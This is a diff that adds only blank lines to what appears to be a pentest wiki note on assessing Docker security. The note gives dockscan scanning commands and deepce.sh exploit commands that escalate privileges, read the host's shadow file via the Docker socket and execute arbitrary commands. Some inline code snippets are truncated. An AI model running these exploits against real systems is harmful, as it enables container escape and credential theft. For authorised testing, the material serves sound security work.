@@ -43,6 +43,8 @@ The Docker Security Assessment is a procedure that allows security professionals
 
 The Docker Security Assessment is a procedure that allows security professionals to assess the security posture of Docker containers. This procedure involves using tools such as Docker Security Vulnerability Scanner and DeepCe Docker Enumeration and Exploitation to identify vulnerabilities and misconfigurations within Docker containers. The offensive use of this procedure is to identify weaknesses that could be exploited by an attacker to gain unauthorized access to the container or the host system. From a technical standpoint, this procedure involves scanning Docker containers for known vulnerabilities and misconfigurations, and attempting to exploit these weaknesses to gain unauthorized access. The business value of this procedure is to ensure that Docker containers are deployed in a secure manner, reducing the risk of a security breach that could result in data loss or system downtime.
 
+ 
+
 ## Requirements
 
 1. Access to Docker containers
@@ -50,6 +52,8 @@ The Docker Security Assessment is a procedure that allows security professionals
 1. Docker Security Vulnerability Scanner
 
 1. DeepCe Docker Enumeration and Exploitation
+
+ 
 
 ## Defense
 
@@ -59,6 +63,8 @@ The Docker Security Assessment is a procedure that allows security professionals
 
 1. Monitor Docker containers for suspicious activity
 
+ 
+
 ## Objectives
 
 1. Identify vulnerabilities and misconfigurations within Docker containers
@@ -67,14 +73,24 @@ The Docker Security Assessment is a procedure that allows security professionals
 
 1. Ensure that Docker containers are deployed in a secure manner
 
+ 
+
 # Instructions
 
 1. This command can be used to scan for security vulnerabilities and audit Docker installations. The 'unix:///var/run/docker.sock' argument specifies the location of the Docker socket file. The '-r html -o myreport' arguments specify the format and output file for the report. The '-v tcp://example.com:5422' argument specifies the location of the vulnerability database.
 
+ 
+
+
+
 **Code**: [[dockscan unix:///var/run/docker.sock
 dockscan -r h]]
 
+
+
 > The 'dockscan' command can be used to scan for security vulnerabilities and audit Docker installations. The 'unix:///var/run/docker.sock' argument specifies the location of the Docker socket file. The '-r html -o myreport' arguments specify the format and output file for the report. The '-v tcp://example.com:5422' argument specifies the location of the vulnerability database. This command can be used to identify any security vulnerabilities in Docker installations and take appropriate measures to patch them.
+
+
 
 **Command** ([[Scan Docker containers using dockscan]]):
 
@@ -82,21 +98,35 @@ dockscan -r h]]
 dockscan unix:///var/run/docker.sock
 ```
 
+
+
+
+
 **Command** ([[Generate HTML report using dockscan]]):
 
 ```bash
 dockscan -r html -o myreport -v tcp://example.com:5422
 ```
 
+
+
 2. To use DeepCe, run the following commands:
+
+ 
+
+
 
 **Code**: [[./deepce.sh 
 ./deepce.sh --no-enumeration --exploi]]
+
+
 
 > 1. `./deepce.sh` - This command will enumerate the Docker environment and provide information about running containers. 
 2. `./deepce.sh --no-enumeration --exploit PRIVILEGED --username deepce --password deepce` - This command will attempt to escalate privileges within the Docker container using the `PRIVILEGED` exploit. The `--username` and `--password` flags should be replaced with valid credentials.
 3. `./deepce.sh --no-enumeration --exploit SOCK --shadow` - This command will attempt to exploit the `SOCK` vulnerability in the Docker container and read the shadow file.
 4. `./deepce.sh --no-enumeration --exploit DOCKER --command "whoami>/tmp/hacked"` - This command will exploit the `DOCKER` vulnerability in the Docker container and write the output of the `whoami` command to a file named `hacked` in the `/tmp` directory.
+
+
 
 **Command** ([[Execute deepce.sh]]):
 
@@ -104,11 +134,19 @@ dockscan -r html -o myreport -v tcp://example.com:5422
 ./deepce.sh
 ```
 
+
+
+
+
 **Command** ([[Exploit PRIVILEGED]]):
 
 ```bash
 ./deepce.sh --no-enumeration --exploit PRIVILEGED --username deepce --password deepce
 ```
+
+
+
+
 
 **Command** ([[Exploit SOCK]]):
 
@@ -116,11 +154,17 @@ dockscan -r html -o myreport -v tcp://example.com:5422
 ./deepce.sh --no-enumeration --exploit SOCK --shadow
 ```
 
+
+
+
+
 **Command** ([[Exploit DOCKER]]):
 
 ```bash
 ./deepce.sh --no-enumeration --exploit DOCKER --command "whoami>/tmp/hacked"
 ```
+
+
 
 ## MITRE ATT&CK Mapping
 
@@ -154,3 +198,5 @@ dockscan -r html -o myreport -v tcp://example.com:5422
 
 - [[Container - Docker Pentest]]
 - [[Tools]]
+
+
